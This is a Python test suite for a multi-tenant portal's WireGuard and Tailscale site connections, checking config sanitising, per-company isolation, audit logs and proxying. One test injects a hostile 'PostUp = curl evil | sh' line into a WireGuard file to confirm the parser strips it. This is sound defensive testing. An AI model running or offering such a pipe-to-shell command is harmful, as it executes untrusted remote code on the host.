"""Site VPN connections (app/tunnels.py, app/routers/tunnels.py): WireGuard client files and Tailscale auth keys per
company, each site through its own company's connection only. The real wireproxy / tailscaled are replaced by
tools/fake_vpn (a real SOCKS5 proxy that logs what it carried)."""
import asyncio
import base64
import socket
from pathlib import Path

import pytest
import uvicorn
from sqlalchemy import select

from app import tunnels
from app.config import get_settings
from app.models import AuditLog, Tunnel
from app.services.sites import probe, site_client
from tests.conftest import login, make_site
from tests.test_tenancy import world  # noqa: F401 - fixture

FAKE = Path(__file__).resolve().parent.parent / "tools" / "fake_vpn"
K1, K2 = base64.b64encode(b"a" * 32).decode(), base64.b64encode(b"b" * 32).decode()
# What a UniFi gateway's WireGuard server hands out for a client (Settings > VPN > VPN Server > WireGuard).
UNIFI = f"""[Interface]
PrivateKey = {K1}
Address = 192.168.3.2/32
DNS = 192.168.3.1

[Peer]
PublicKey = {K2}
AllowedIPs = 0.0.0.0/0
Endpoint = 203.0.113.5:51820
"""


def free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


@pytest.fixture(autouse=True)
async def fake_vpn(monkeypatch, tmp_path):
    s = get_settings()
    for k, v in {"tunnels_dir": str(tmp_path / "tunnels"), "wireproxy_path": str(FAKE / "wireproxy"),
                 "tailscaled_path": str(FAKE / "tailscaled"), "tailscale_path": str(FAKE / "tailscale"),
                 "tunnel_port_base": free_port() // 2 * 2 - 200}.items():
        monkeypatch.setattr(s, k, v)
    yield
    await tunnels.supervisor.shutdown()


async def until(cond, timeout=10.0):
    for _ in range(int(timeout / 0.1)):
        if cond():
            return True
        await asyncio.sleep(0.1)
    return False


def test_unifi_client_file_is_rewritten_with_only_what_wireguard_needs():
    cfg = tunnels.parse_wireguard(UNIFI.replace("DNS = 192.168.3.1", "DNS = 192.168.3.1\nPostUp = curl evil | sh\nTable = off"))
    text = cfg.render("127.0.0.1:40002")
    assert "PostUp" not in text and "curl" not in text and "Table" not in text
    assert "PersistentKeepalive = 25" in text and text.rstrip().endswith("BindAddress = 127.0.0.1:40002")
    assert cfg.summary() == {"address": "192.168.3.2/32", "endpoint": "203.0.113.5:51820", "allowed_ips": "0.0.0.0/0",
                             "peer_key": K2[:8] + "…", "peers": 1}
    for bad, says in [(UNIFI.replace(K1, "not-a-key"), "PrivateKey isn't a WireGuard key"),
                      (UNIFI.replace("Endpoint = 203.0.113.5:51820\n", ""), "needs an Endpoint"),
                      (UNIFI + "\n[Socks5]\nBindAddress = 0.0.0.0:1080\n", "unexpected section [socks5]"),
                      (UNIFI.replace("[Peer]", "[Peer]\nListenOn = 1"), "unknown setting 'listenon'"),
                      ("hello", "isn't part of a WireGuard file")]:
        with pytest.raises(ValueError, match=says.replace("[", r"\[").replace("]", r"\]")):
            tunnels.parse_wireguard(bad)
    assert tunnels.check_auth_key(" tskey-auth-kAbC123456CNTRL-xyz ") == "tskey-auth-kAbC123456CNTRL-xyz"
    with pytest.raises(ValueError):
        tunnels.check_auth_key("hunter2")


async def test_each_company_has_its_own_vpn_connections(client, session, world):  # noqa: F811
    a_id, b_id = world["a"].id, world["b"].id
    sa, sb = world["sites"]["Acme Security"].id, world["sites"]["Bravo Guards"].id
    await login(client, world["a_admin"].email)
    r = await client.post("/api/tunnels", json={"kind": "wireguard", "name": "Warehouse UniFi", "config": UNIFI})
    assert r.status_code == 200, r.text
    wg = r.json()
    assert wg["tenant_id"] == a_id and wg["info"]["endpoint"] == "203.0.113.5:51820" and K1 not in r.text
    r = await client.post("/api/tunnels", json={"kind": "wireguard", "name": "Broken", "config": "nope"})
    assert r.status_code == 400 and "WireGuard file" in r.json()["detail"]["message"]
    assert (await client.post("/api/tunnels", json={"kind": "wireguard", "name": "Warehouse UniFi", "config": UNIFI})).status_code == 409
    assert await until(lambda: tunnels.supervisor.status(wg["id"])["state"] == "connected")

    # Acme's site uses it; Acme's file and key never come back.
    site = (await client.get(f"/api/sites/{sa}")).json()
    body = {k: site[k] for k in ("name", "host", "nx_user", "address", "lat", "lng", "notes")}
    r = await client.put(f"/api/sites/{sa}", json={**body, "connect": False, "tunnel_id": wg["id"]})
    assert r.status_code == 200, r.text
    assert r.json()["tunnel"] == {"id": wg["id"], "name": "Warehouse UniFi", "kind": "wireguard"}
    listed = (await client.get("/api/tunnels")).json()
    assert [(t["name"], t["sites"], t["status"]["state"]) for t in listed] == [("Warehouse UniFi", [{"id": sa, "name": "Acme Security HQ"}], "connected")]
    assert K1 not in str(listed)
    r = await client.delete(f"/api/tunnels/{wg['id']}")
    assert r.status_code == 409 and "Acme Security HQ" in r.json()["detail"]["message"]

    # Bravo can't see, change, delete or use Acme's connection.
    await login(client, world["b_admin"].email)
    assert (await client.get("/api/tunnels")).json() == []
    assert (await client.put(f"/api/tunnels/{wg['id']}", json={"enabled": False})).status_code == 404
    assert (await client.delete(f"/api/tunnels/{wg['id']}")).status_code == 404
    site = (await client.get(f"/api/sites/{sb}")).json()
    body = {k: site[k] for k in ("name", "host", "nx_user", "address", "lat", "lng", "notes")}
    r = await client.put(f"/api/sites/{sb}", json={**body, "connect": False, "tunnel_id": wg["id"]})
    assert r.status_code == 400 and "doesn't belong" in r.json()["detail"]["message"]
    r = await client.post("/api/sites/test", json={"host": "https://10.0.0.5:7001", "nx_user": "x", "nx_pass": "y", "tunnel_id": wg["id"]})
    assert r.status_code == 400 and "doesn't belong" in r.json()["detail"]["message"]
    # Operators don't manage VPN connections.
    await login(client, world["b_op"].email)
    assert (await client.get("/api/tunnels")).status_code == 403

    # TWG support can, inside Acme; the customer's log shows it.
    await login(client, world["twg_admin"].email)
    await client.post("/api/scope", json={"scope": str(a_id)})
    r = await client.put(f"/api/tunnels/{wg['id']}", json={"name": "Warehouse (UniFi)"})
    assert r.status_code == 200 and r.json()["name"] == "Warehouse (UniFi)"
    actions = (await session.scalars(select(AuditLog.action).where(AuditLog.tenant_id == a_id, AuditLog.action.like("tunnel.%"))
                                     .order_by(AuditLog.id))).all()
    assert actions == ["tunnel.created", "tunnel.updated"]
    assert not (await session.scalars(select(AuditLog).where(AuditLog.tenant_id == b_id, AuditLog.action.like("tunnel.%")))).all()


async def test_tailscale_signs_in_once_and_leaves_the_tailnet_when_deleted(client, session, admin):
    _, user = admin
    await login(client, user.email)
    r = await client.post("/api/tunnels", json={"kind": "tailscale", "name": "Office tailnet", "auth_key": "tskey-auth-bad0000000"})
    bad = r.json()
    assert await until(lambda: tunnels.supervisor.status(bad["id"])["state"] == "failed")
    assert "invalid key" in tunnels.supervisor.status(bad["id"])["detail"]
    r = await client.put(f"/api/tunnels/{bad['id']}", json={"auth_key": "tskey-auth-good000000"})
    assert r.status_code == 200 and r.json()["info"]["hostname"] == f"twg-portal-twg-security-{bad['id']}"
    assert await until(lambda: tunnels.supervisor.status(bad["id"])["state"] == "connected")
    assert "100.64.0.7" in tunnels.supervisor.status(bad["id"])["detail"]
    state = Path(get_settings().tunnels_dir) / f"ta-{bad['id']}"
    assert not (state / "authkey").exists()                          # the key isn't left on disk
    r = await client.put(f"/api/tunnels/{bad['id']}", json={"enabled": False})
    assert r.json()["status"]["state"] == "off"
    assert (await client.delete(f"/api/tunnels/{bad['id']}")).status_code == 200
    assert await session.get(Tunnel, bad["id"]) is None and not state.exists()


async def test_nx_is_reached_through_the_sites_vpn(client, session, admin):
    """A real NX (tools/fake_nx.py) on a real port, reached only through the connection's SOCKS proxy."""
    from tools import fake_nx
    port = free_port()
    server = uvicorn.Server(uvicorn.Config(fake_nx.app, host="127.0.0.1", port=port, log_level="error"))
    task = asyncio.create_task(server.serve())
    try:
        await until(lambda: server.started)
        tenant, user = admin
        await login(client, user.email)
        wg = (await client.post("/api/tunnels", json={"kind": "wireguard", "name": "Site LAN", "config": UNIFI})).json()
        assert await until(lambda: tunnels.supervisor.status(wg["id"])["state"] == "connected")
        r = await client.post("/api/sites/test", json={"host": f"http://127.0.0.1:{port}", "nx_user": "portal", "nx_pass": "x",
                                                      "tunnel_id": wg["id"]})
        assert r.status_code == 200, r.text
        log = Path(get_settings().tunnels_dir) / f"wi-{wg['id']}" / "connections.log"
        assert f"127.0.0.1:{port}" in log.read_text()                 # it went through the tunnel
        # A saved site: every NX call follows its connection.
        s = await make_site(session, tenant, host=f"http://127.0.0.1:{port}")
        s.tunnel_id = wg["id"]
        await session.commit()
        c = site_client(s)
        assert c.proxy == tunnels.proxy_url(wg["id"])
        info = await probe(c)
        await c.close()
        assert info["camera_count"] >= 1
        # The connection goes down: NX answers come back as a VPN problem, in words.
        await tunnels.supervisor.stop(wg["id"])
        c = site_client(s)
        with pytest.raises(Exception) as exc:
            await probe(c)
        await c.close()
        assert "VPN connection" in str(exc.value)
    finally:
        server.should_exit = True
        await task
